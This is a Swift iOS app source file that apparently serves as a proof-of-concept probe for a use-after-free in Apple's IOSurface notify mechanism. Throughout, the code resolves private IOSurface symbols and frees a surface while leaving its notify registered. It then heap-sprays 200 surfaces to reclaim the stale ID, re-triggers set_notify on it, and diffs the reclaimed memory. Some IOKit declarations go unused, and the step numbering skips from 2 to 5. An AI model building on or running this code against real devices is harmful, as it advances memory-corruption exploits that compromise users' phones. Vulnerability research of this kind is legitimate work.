import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v93 - UAF + surface memory diff").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v93")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v93 - UAF + surface memory diff ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID"),
              let lockSym = dlsym(fwH, "IOSurfaceLock"),
              let unlockSym = dlsym(fwH, "IOSurfaceUnlock"),
              let planeSym = dlsym(fwH, "IOSurfaceGetBaseAddress") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }

        let gSet = unsafeBitCast(setSym, to: (@convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t).self)
        let gRemove = unsafeBitCast(remSym, to: (@convention(c) (UInt64) -> kern_return_t).self)
        let gCreate = unsafeBitCast(createSym, to: (@convention(c) (CFDictionary) -> UnsafeMutableRawPointer?).self)
        let gGetID = unsafeBitCast(getIdSym, to: (@convention(c) (UnsafeMutableRawPointer) -> UInt32).self)
        let gLock = unsafeBitCast(lockSym, to: (@convention(c) (UnsafeMutableRawPointer, UInt32, UnsafeMutablePointer<UInt32>?) -> kern_return_t).self)
        let gUnlock = unsafeBitCast(unlockSym, to: (@convention(c) (UnsafeMutableRawPointer, UInt32, UnsafeMutablePointer<UInt32>?) -> kern_return_t).self)
        let gGetPlanePtr = unsafeBitCast(planeSym, to: (@convention(c) (UnsafeMutableRawPointer, UInt32) -> UnsafeMutableRawPointer?).self)

        emit("[*] symbols resolved")

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] port 0x\(String(gPort, radix: 16)) kr=0x\(String(kr, radix: 16))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        func makeSurface() -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = 256
            props["IOSurfaceHeight"] = 256
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }

        func readSurface(_ surf: UnsafeMutableRawPointer, _ plane: UInt32, _ len: Int) -> [UInt8] {
            var seed: UInt32 = 0
            var data: [UInt8] = []
            let krlock = gLock(surf, plane, &seed)
            if krlock == KERN_SUCCESS {
                if let ptr = gGetPlanePtr(surf, plane) {
                    let bytePtr = ptr.bindMemory(to: UInt8.self, capacity: len)
                    for i in 0..<len {
                        data.append(bytePtr.advanced(by: i).pointee)
                    }
                }
                _ = gUnlock(surf, plane, &seed)
            }
            return data
        }

        // Create surface A, register notify
        emit("\n=== Step 1: Create surface A, register notify ===")
        var sA: UnsafeMutableRawPointer? = makeSurface()
        guard let sAp = sA else { emit("[-] create A failed"); status = "Complete"; isRunning = false; return }
        let idA = gGetID(sAp)
        emit("[A] surface id 0x\(String(idA, radix: 16))")
        let krSet = gSet(gPort, 1, UInt64(idA))
        emit("[A] set_notify kr=0x\(String(krSet, radix: 16))")

        // Release A without removing notify
        Unmanaged<AnyObject>.fromOpaque(sAp).release()
        emit("[A] released without remove")

        // Spray surfaces
        emit("\n=== Step 2: Spray surfaces ===")
        var sprayed: [UnsafeMutableRawPointer?] = []
        var reusedSurface: UnsafeMutableRawPointer? = nil
        for i in 0..<200 {
            if let s = makeSurface() {
                sprayed.append(s)
                let sid = gGetID(s)
                if sid == idA {
                    emit("[!] sprayed #\(i) same id 0x\(String(sid, radix: 16))")
                    reusedSurface = s
                }
            }
        }
        emit("[*] sprayed \(sprayed.count) surfaces")

        // Read surface B's memory BEFORE set_notify on stale id
        if let reused = reusedSurface {
            emit("\n=== Step 5: Read surface B memory BEFORE set_notify ===")
            var seed: UInt32 = 0
            let krlock = gLock(reused, 0, &seed)
            if krlock == KERN_SUCCESS {
                if let ptr = gGetPlanePtr(reused, 0) {
                    let bytePtr = ptr.bindMemory(to: UInt8.self, capacity: 256)
                    let before = (0..<256).map { bytePtr.advanced(by: $0).pointee }
                    emit("[*] surface B memory before set_notify: \(before.prefix(16).map { String(format: "%02x", $0) }.joined())")
                }
                let _ = gUnlock(reused, 0, &seed)
            }
        }

        // Remove stale client
        let krRem = gRemove(UInt64(idA))
        emit("[B] remove stale=0x\(String(krRem, radix: 16))")

        // Set notify again on stale id
        let krSetAgain = gSet(gPort, 1, UInt64(idA))
        emit("[C] set again=0x\(String(krSetAgain, radix: 16))")

        // Read surface B's memory AFTER set_notify on stale id
        if let reused = reusedSurface {
            emit("\n=== Step 6: Read surface B memory AFTER set_notify ===")
            var seed: UInt32 = 0
            let krlock = gLock(reused, 0, &seed)
            if krlock == KERN_SUCCESS {
                if let ptr = gGetPlanePtr(reused, 0) {
                    let bytePtr = ptr.bindMemory(to: UInt8.self, capacity: 256)
                    let after = (0..<256).map { bytePtr.advanced(by: $0).pointee }
                    emit("[*] surface B memory after set_notify: \(after.prefix(16).map { String(format: "%02x", $0) }.joined())")
                }
                let _ = gUnlock(reused, 0, &seed)
            }
        }

        // Clean up sprayed surfaces
        for s in sprayed {
            if let s = s { Unmanaged<AnyObject>.fromOpaque(s).release() }
        }

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}

// External IOKit function declarations
@_silgen_name("IOServiceGetMatchingServices")
func IOServiceGetMatchingServices(_ masterPort: mach_port_t, _ matching: UnsafeMutableRawPointer, _ existing: UnsafeMutablePointer<io_iterator_t>?) -> kern_return_t

@_silgen_name("IOIteratorNext")
func IOIteratorNext(_ iterator: io_iterator_t) -> io_object_t

@_silgen_name("IOServiceOpen")
func IOServiceOpen(_ service: io_object_t, _ owningTask: mach_port_t, _ type: UInt32, _ client: UnsafeMutablePointer<io_connect_t>?) -> kern_return_t

@_silgen_name("IOObjectRelease")
func IOObjectRelease(_ object: io_object_t) -> kern_return_t

@_silgen_name("IOServiceMatching")
func IOServiceMatching(_ name: UnsafePointer<Int8>) -> UnsafeMutableRawPointer?

@_silgen_name("IOConnectCallMethod")
func IOConnectCallMethod(_ connection: io_connect_t, _ selector: UInt32, _ input: UnsafePointer<UInt64>?, _ inputCnt: UInt32, _ inputStruct: UnsafeMutableRawPointer?, _ inputStructCnt: UInt64, _ output: UnsafeMutablePointer<UInt64>?, _ outputCnt: UnsafeMutablePointer<UInt32>?, _ outputStruct: UnsafeMutableRawPointer?, _ outputStructCnt: UnsafeMutablePointer<UInt64>?) -> kern_return_t

@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
